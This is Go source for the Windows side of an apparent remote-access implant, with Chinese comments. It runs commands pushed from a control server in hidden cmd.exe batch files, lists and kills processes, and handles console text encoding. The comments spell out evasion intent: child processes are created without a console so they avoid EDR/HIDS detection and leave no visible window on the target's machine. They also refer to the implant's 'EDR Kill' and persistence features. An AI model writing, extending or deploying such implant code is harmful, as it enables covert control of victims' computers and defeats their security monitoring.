//go:build windows

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"
)

// cmdTimeout 一次性命令最大运行时长：防止 agent 下发的阻塞/交互命令（如
// powershell 下载、ping 长循环）把植入端拖死在执行上，导致心跳超时被服务端
// 判定离线（前端显示 network error）。超时后杀子进程，植入端继续跑。
const cmdTimeout = 90 * time.Second

func getUsername() string {
	username := os.Getenv("USERNAME")
	if username == "" {
		username = "unknown"
	}
	return username
}

func getDefaultDir() string {
	return os.Getenv("USERPROFILE")
}

// createNoWindowFlag 对应 CREATE_NO_WINDOW（0x08000000）：不为控制台程序分配控制台。
//
// 为什么同时要 HideWindow + CREATE_NO_WINDOW：只设 HideWindow 时 Windows 仍会为子进程
// **分配一个控制台**（只是随后隐藏），在目标机桌面上可能闪一帧黑框，且"GUI 进程创建控制台
// 子进程"本身就是 EDR/HIDS 的高信号行为。CREATE_NO_WINDOW 才是彻底不建控制台。
const createNoWindowFlag = 0x08000000

func getSysProcAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindowFlag,
	}
}

// systemRoot 返回 Windows 系统根目录（如 C:\Windows），不依赖 PATH。
func systemRoot() string {
	root := os.Getenv("SystemRoot")
	if root == "" {
		root = os.Getenv("WINDIR")
	}
	if root == "" {
		root = `C:\Windows`
	}
	return root
}

// sysBin 返回 System32 目录下可执行文件的绝对路径。
// 当环境变量被清理、PATH 缺失时，exec.Command("cmd") 等会报 "不是内部或外部命令"，
// 使用绝对路径可彻底摆脱对 PATH 的依赖。
func sysBin(name string) string {
	return filepath.Join(systemRoot(), "System32", name)
}

// sysPowershell 返回 PowerShell 可执行文件的绝对路径（位于 System32 子目录）。
func sysPowershell() string {
	return filepath.Join(systemRoot(), "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
}

// buildCmd 将整条命令写入临时 .bat 文件后通过 cmd /c 执行。
// 直接 exec.Command("cmd","/c",command) 存在两个问题：
//  1. 依赖 PATH，PATH 缺失时无法启动 cmd；
//  2. Go 在 Windows 会对含空格/引号的参数自动加引号并把内部引号转义为 \"，
//     cmd 不识别 \" 转义，导致带双引号的命令（如 echo "hi"）解析报错。
//
// 写入 bat 文件可原样保留用户命令，同时规避 cmd /c 的引号陷阱。
func buildCmd(command string) (*exec.Cmd, func()) {
	noop := func() {}
	if command == "" {
		return exec.Command(sysBin("cmd.exe"), "/d", "/c", command), noop
	}
	f, err := os.CreateTemp("", "toshell_*.bat")
	if err != nil {
		// 临时文件创建失败（如无写权限）时回退为直接执行
		return exec.Command(sysBin("cmd.exe"), "/d", "/s", "/c", command), noop
	}
	// cmd 批处理按系统 ANSI 代码页（中文系统为 GBK）解析，中文命令需转 GBK 写入
	f.Write(utf8ToGBK([]byte("@echo off\r\n" + command + "\r\n")))
	f.Close()
	cleanup := func() { os.Remove(f.Name()) }
	return exec.Command(sysBin("cmd.exe"), "/d", "/c", f.Name()), cleanup
}

func executeCommand(command string, args []string) (string, int32, string) {
	// 用可超时的 context 执行一次性命令，避免阻塞/交互命令拖死植入端。
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	var cmd *exec.Cmd

	if len(args) > 0 {
		cmd = exec.CommandContext(ctx, command, args...)
	} else {
		c, cleanup := buildCmd(command)
		defer cleanup()
		cmd = c
		// buildCmd 返回的是 exec.Command，需用 context 包装为 CommandContext
		cmd = exec.CommandContext(ctx, cmd.Path, cmd.Args[1:]...)
	}
	cmd.Dir = os.Getenv("USERPROFILE")
	cmd.SysProcAttr = getSysProcAttr()

	out, err := cmd.CombinedOutput()
	if err != nil {
		// 超时：返回明确提示，植入端继续跑，不因该任务卡死心跳
		if ctx.Err() == context.DeadlineExceeded {
			return string(out), -1, "command timed out after " + cmdTimeout.String()
		}
		code := int32(-1)
		if ee, ok := err.(*exec.ExitError); ok {
			code = int32(ee.ExitCode())
		}
		// 附加命令输出中的具体报错（归一成 UTF-8 便于定位失败原因）。
		// 这里也用逐行判定：命令输出可能已经是 UTF-8（例如 PowerShell 7 / 自带 UTF-8 的工具），
		// 无脑 GBK 转换会把正确中文打成乱码（与 executeTask 末尾同一口径）。
		errMsg := err.Error()
		if len(out) > 0 {
			errMsg = errMsg + ": " + decodeConsoleText(string(out))
		}
		return string(out), code, errMsg
	}
	return string(out), 0, ""
}

func listProcesses() (string, int32, string) {
	cmd := exec.Command(sysBin("tasklist.exe"), "/fo", "csv", "/nh")
	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, err.Error()
	}

	var result strings.Builder
	result.WriteString("PID      Session Name                   Name\n")
	result.WriteString("---      ------------                   ----\n")

	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if line == "" {
			continue
		}
		fields := strings.Split(line, ",")
		if len(fields) >= 3 {
			name := strings.Trim(fields[0], "\"")
			pid := strings.Trim(fields[1], "\"")
			session := strings.Trim(fields[2], "\"")
			result.WriteString(fmt.Sprintf("%-8s %-30s %s\n", pid, session, name))
		}
	}

	return result.String(), 0, ""
}

func killProcess(pid uint32) (string, int32, string) {
	cmd := exec.Command(sysBin("taskkill.exe"), "/F", "/PID", fmt.Sprintf("%d", pid))
	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), -1, err.Error()
	}
	return string(out), 0, ""
}

// ─── GBK ↔ UTF-8 转换（A1）───
// 移除 golang.org/x/text/encoding/simplifiedchinese 依赖（其 GBK 字符表约 1MB+），
// 改为直接调用 kernel32.dll 的 MultiByteToWideChar / WideCharToMultiByte：
//
//	GBK(CP936) → UTF-16 → UTF-8(CP65001)   （gbkToUTF8）
//	UTF-8      → UTF-16 → GBK(CP936)       （utf8ToGBK）
//
// 系统 API 无自带字符表，体积零开销，转换结果与 x/text 等价。
var (
	procMultiByteToWideChar = resolveAPI("kernel32.dll", "MultiByteToWideChar")
	procWideCharToMultiByte = resolveAPI("kernel32.dll", "WideCharToMultiByte")
)

const (
	cpGBK  = 936   // ANSI 简体中文代码页
	cpUTF8 = 65001 // UTF-8 代码页
)

// wcharBufPool 复用 UTF-16 中间缓冲，避免每次转换重复分配（B2）。
var wcharBufPool = sync.Pool{
	New: func() interface{} { return make([]uint16, 4096) },
}

// mbToWide 将指定代码页的多字节串转换为 UTF-16。
func mbToWide(cp uint32, s []byte) []uint16 {
	if len(s) == 0 {
		return nil
	}
	n, _, _ := procMultiByteToWideChar.Call(
		uintptr(cp), 0, uintptr(unsafe.Pointer(&s[0])), uintptr(len(s)), 0, 0)
	if n == 0 {
		return nil
	}
	buf := wcharBufPool.Get().([]uint16)
	if uintptr(len(buf)) < n {
		buf = make([]uint16, n)
	}
	r, _, _ := procMultiByteToWideChar.Call(
		uintptr(cp), 0, uintptr(unsafe.Pointer(&s[0])), uintptr(len(s)),
		uintptr(unsafe.Pointer(&buf[0])), n)
	if r == 0 {
		wcharBufPool.Put(buf)
		return nil
	}
	out := make([]uint16, r)
	copy(out, buf[:r])
	wcharBufPool.Put(buf)
	return out
}

// wideToMb 将 UTF-16 串转换为指定代码页的多字节串。
func wideToMb(cp uint32, ws []uint16) []byte {
	if len(ws) == 0 {
		return nil
	}
	n, _, _ := procWideCharToMultiByte.Call(
		uintptr(cp), 0, uintptr(unsafe.Pointer(&ws[0])), uintptr(len(ws)), 0, 0, 0, 0)
	if n == 0 {
		return nil
	}
	out := make([]byte, n)
	r, _, _ := procWideCharToMultiByte.Call(
		uintptr(cp), 0, uintptr(unsafe.Pointer(&ws[0])), uintptr(len(ws)),
		uintptr(unsafe.Pointer(&out[0])), n, 0, 0)
	if r == 0 {
		return nil
	}
	return out[:r]
}

func gbkToUTF8(data []byte) []byte {
	if ws := mbToWide(cpGBK, data); ws != nil {
		if out := wideToMb(cpUTF8, ws); out != nil {
			return out
		}
	}
	return data
}

func utf8ToGBK(data []byte) []byte {
	if ws := mbToWide(cpUTF8, data); ws != nil {
		if out := wideToMb(cpGBK, ws); out != nil {
			return out
		}
	}
	return data
}

// decodeConsoleText 把任务输出归一成 UTF-8（**逐行判定**，这是关键）。
//
// 历史 bug：executeTask 末尾对**整串**输出无条件跑一遍 gbkToUTF8，于是植入端自己写的
// UTF-8 中文回执（"== EDR Kill (击杀) =="、"持久化成功"、启动项 JSON 里中文描述）被当成
// GBK 又转了一次，界面上就是"鍑绘潃 / 娉ㄥ唽琛ㄥ惎鍔"这类乱码；而被调用的中文控制台
// 工具（taskkill/reg/sc…）吐的真实 GBK 又确实需要转 —— 一串里两种编码混着，整串转只能
// 满足一边。
//
// 逐行判定的依据：GBK 双字节的尾字节多在 0x40–0xFE，绝大多数组合不是合法 UTF-8 序列；
// 而植入端自己写的中文/ASCII 一律是合法 UTF-8。因此：
//   - 整串已合法 UTF-8（纯植入端文本、纯 ASCII、base64 JSON…）→ 原样返回，零改动；
//   - 否则逐行：合法 UTF-8 的行原样保留，非法 UTF-8 的行按 GBK→UTF-8 转。
//
// 幂等：合法 UTF-8 输入永远原样返回，所以"捕获点转一次 + 汇总处再转一次"不会二次损坏。
//
// 为什么一定要在客户端转：结果帧是 json.Marshal(Result)，非法 UTF-8 字节在序列化时会被
// 替换成 U+FFFD（字节永久丢失），服务端拿到的是"已经救不回来的"文本。服务端展示层
// （internal/common/encoding）只作旧版本载荷与其它来源的兜底。
func decodeConsoleText(s string) string {
	if s == "" || utf8.ValidString(s) {
		return s
	}
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		if line == "" || utf8.ValidString(line) {
			continue
		}
		lines[i] = string(gbkToUTF8([]byte(line)))
	}
	return strings.Join(lines, "\n")
}
